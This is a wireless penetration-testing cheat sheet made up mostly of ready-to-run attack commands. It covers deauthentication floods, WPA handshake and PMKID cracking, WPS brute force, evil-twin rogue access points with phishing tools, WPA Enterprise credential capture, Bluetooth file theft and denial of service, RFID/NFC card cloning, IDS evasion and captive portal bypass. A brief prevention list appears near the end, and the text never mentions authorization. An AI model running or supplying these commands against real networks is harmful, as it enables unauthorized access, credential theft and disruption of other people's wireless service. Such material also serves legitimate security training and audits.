# Wireless Security Testing

## Overview

Wireless security testing involves identifying vulnerabilities in wireless networks, including WiFi, Bluetooth, RFID, and other wireless protocols.

---

## WiFi Security Testing

### Prerequisites
```bash
# Install required tools
apt-get install aircrack-ng reaver wifite hostapd dnsmasq

# Put wireless card in monitor mode
airmon-ng check kill
airmon-ng start wlan0
# Interface becomes wlan0mon

# Check monitor mode
iwconfig
```

### Network Discovery
```bash
# Scan for wireless networks
airodump-ng wlan0mon

# Scan specific channel
airodump-ng -c 6 wlan0mon

# Scan specific BSSID
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

---

## WPA/WPA2 Attacks

### Capturing Handshake
```bash
# Start capture
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate client (in new terminal)
aireplay-ng --deauth 10 -a <BSSID> wlan0mon
aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Wait for WPA handshake (will show in airodump-ng)
```

### Cracking WPA/WPA2
```bash
# Aircrack-ng with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture-01.cap

# Hashcat (convert cap to hccapx first)
cap2hccapx.bin capture-01.cap output.hccapx
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt

# John the Ripper
aircrack-ng capture-01.cap -J output
john --wordlist=/usr/share/wordlists/rockyou.txt output.hccap
```

### WPA3 Attacks
```bash
# Dragonblood vulnerabilities (CVE-2019-13377)
# Downgrade attacks
# Side-channel attacks

# Tools
wpa_sycophant
hostapd-wpe
```

---

## WPS Attacks

### WPS PIN Attack (Reaver)
```bash
# Check if WPS is enabled
wash -i wlan0mon

# Reaver attack
reaver -i wlan0mon -b <BSSID> -vv

# With specific parameters
reaver -i wlan0mon -b <BSSID> -c <channel> -vv -L -N -d 15 -T .5 -r 3:15

# Pixie Dust attack (faster)
reaver -i wlan0mon -b <BSSID> -c <channel> -vv -K
```

### Bully (Alternative to Reaver)
```bash
bully -b <BSSID> -c <channel> wlan0mon
```

---

## Evil Twin / Rogue AP

### Manual Setup
```bash
# Create rogue AP with hostapd
# Configuration file: hostapd.conf
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0

# Start hostapd
hostapd hostapd.conf

# Configure DHCP with dnsmasq
# dnsmasq.conf
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
```

### Automated Tools
```bash
# Wifiphisher
wifiphisher -aI wlan0 -eI eth0

# Fluxion
./fluxion.sh

# WiFi Pumpkin
wifi-pumpkin

# EAPHammer (Enterprise WPA)
./eaphammer --interface wlan0 --essid "Corporate" --channel 1
```

---

## WEP Attacks (Legacy)

### ARP Replay Attack
```bash
# Start capture
airodump-ng -c <channel> --bssid <BSSID> -w wep wlan0mon

# Fake authentication
aireplay-ng -1 0 -a <BSSID> wlan0mon

# ARP replay
aireplay-ng -3 -b <BSSID> wlan0mon

# Crack WEP key (need ~50k IVs)
aircrack-ng wep-01.cap
```

---

## Attacking WPA Enterprise

### EAP-TLS/TTLS/PEAP
```bash
# hostapd-wpe (Wireless Pwnage Edition)
hostapd-wpe hostapd-wpe.conf

# Capture MSCHAPV2 challenge/response
# Crack with asleap or hashcat
asleap -C <challenge> -R <response> -W wordlist.txt

# Hashcat
hashcat -m 5500 netntlmv2.txt wordlist.txt
```

### EAPHammer
```bash
# Rogue AP for enterprise networks
./eaphammer --interface wlan0 --essid "Corporate-WiFi" --channel 6 --auth wpa-psk --creds

# Hostile portal attack
./eaphammer --interface wlan0 --essid "Corporate-WiFi" --hostile-portal
```

---

## Deauthentication Attacks

```bash
# Deauth specific client
aireplay-ng --deauth 0 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Deauth all clients
aireplay-ng --deauth 0 -a <BSSID> wlan0mon

# MDK3 (alternative)
mdk3 wlan0mon d -b blacklist.txt

# MDK4
mdk4 wlan0mon d -B <BSSID>
```

---

## PMKID Attack

```bash
# Capture PMKID (no client needed!)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcaptool -z pmkid.hash capture.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.hash wordlist.txt
```

---

## Wireless Network Mapping

```bash
# Kismet
kismet -c wlan0mon

# Wigle WiFi
# Android app for war driving

# GPS mapping
airodump-ng --gpsd wlan0mon
```

---

## Bluetooth Attacks

### Bluetooth Scanning
```bash
# Scan for devices
hcitool scan

# More detailed scan
hcitool inq

# Device information
hcitool info <MAC>

# bluetoothctl
bluetoothctl
scan on
devices
info <MAC>
```

### Bluetooth Exploitation
```bash
# BlueMaho
bluemaho

# Bluediving
bluediving

# Bluesnarfer (file theft)
bluesnarfer -b <MAC>

# Blueprinting
blueprinting.py <MAC>

# L2ping (DoS)
l2ping -i hci0 -s 600 -f <MAC>
```

### BLE (Bluetooth Low Energy)
```bash
# Scan BLE devices
hcitool lescan

# Gatttool
gatttool -b <MAC> -I
connect
characteristics
char-read-hnd <handle>

# Btlejack (sniffing/hijacking)
btlejack -s
btlejack -f <connection>
btlejack -c <connection>
```

---

## RFID/NFC Attacks

### RFID Cloning
```bash
# Proxmark3
proxmark3

# Read RFID card
lf search
hf search

# Clone card
lf clone

# Simulate card
lf sim
```

### NFC Tools
```bash
# libnfc
nfc-list
nfc-poll

# mfoc (MIFARE Classic Offline Cracker)
mfoc -O dump.mfd

# mfcuk (MIFARE Classic Universal toolKit)
mfcuk -C -R 0:A
```

---

## Wireless IDS Evasion

```bash
# MAC address spoofing
macchanger -r wlan0
ifconfig wlan0 down
macchanger -m AA:BB:CC:DD:EE:FF wlan0
ifconfig wlan0 up

# Slow down attacks
# Use delays in reaver, aircrack-ng tools

# Channel hopping
airodump-ng --channel-hop wlan0mon
```

---

## Automated Wireless Auditing

### Wifite2
```bash
# Attack all networks
wifite

# WPA only
wifite --wpa

# Specific target
wifite --bssid <BSSID>

# Custom wordlist
wifite --dict /path/to/wordlist.txt
```

### Airgeddon
```bash
./airgeddon.sh
# GUI-based wireless auditing tool
```

### WiFi-Pumpkin3
```bash
# Create rogue AP with captive portal
wifipumpkin3
# Select plugins and start attack
```

---

## Captive Portal Bypass

```bash
# MAC spoofing
# Find authorized MAC
airodump-ng wlan0mon
# Spoof MAC
macchanger -m <AUTHORIZED_MAC> wlan0

# DNS tunneling
iodine
dnscat2

# ICMP tunneling
ptunnel
```

---

## Wireless Sniffing

```bash
# Wireshark
wireshark -i wlan0mon

# tshark
tshark -i wlan0mon

# tcpdump
tcpdump -i wlan0mon -w capture.pcap

# Filters for wireless
# Beacon frames: wlan.fc.type_subtype == 0x08
# Probe requests: wlan.fc.type_subtype == 0x04
# Deauth frames: wlan.fc.type_subtype == 0x0c
```

---

## WiFi Password Sharing Attacks

### Android WiFi QR Codes
```bash
# Extract WiFi passwords from QR codes
# QR code format: WIFI:T:WPA;S:<SSID>;P:<PASSWORD>;;
zbarimg qr_code.png
```

### Router Config Backups
```bash
# Extract passwords from router backups
# Many routers export plaintext passwords
strings router_backup.bin | grep -i "password\|wpa"
```

---

## Wireless Attack Prevention

1. **Use WPA3** - Latest encryption standard
2. **Disable WPS** - Vulnerable to brute force
3. **Strong passwords** - 12+ characters, random
4. **Hide SSID** - Basic obscurity (not foolproof)
5. **MAC filtering** - Can be bypassed but adds layer
6. **Enterprise WPA** - For corporate environments
7. **Regular firmware updates** - Patch vulnerabilities
8. **Monitor for rogue APs** - Detect evil twins
9. **Client isolation** - Prevent client-to-client attacks
10. **VPN on public WiFi** - Encrypt all traffic

---

## Wireless Security Standards

### WEP (Wired Equivalent Privacy)
- **DEPRECATED** - Easily cracked
- RC4 encryption
- 24-bit IV (too small)

### WPA (WiFi Protected Access)
- **DEPRECATED** - Vulnerable to KRACK
- TKIP encryption
- Improved over WEP

### WPA2
- AES-CCMP encryption
- Vulnerable to KRACK, PMKID attacks
- Still widely used

### WPA3
- SAE (Simultaneous Authentication of Equals)
- Forward secrecy
- Protection against offline dictionary attacks
- Some implementations vulnerable to Dragonblood

---

## Wireless Pentesting Tools

### Scanning & Recon
- Airodump-ng
- Kismet
- Wash
- Wifite

### Attacks
- Aircrack-ng suite
- Reaver
- Bully
- Wifiphisher
- Fluxion
- EAPHammer

### Bluetooth
- Bluediving
- Bluesnarfer
- Btlejack
- Ubertooth

### RFID/NFC
- Proxmark3
- Chameleon
- ACR122U

---

## Further Reading

- WiFi Security: Preventing WPA/WPA2 Attacks
- Bluetooth Security
- RFID Security Guide
- Wireless Pentesting with Kali Linux
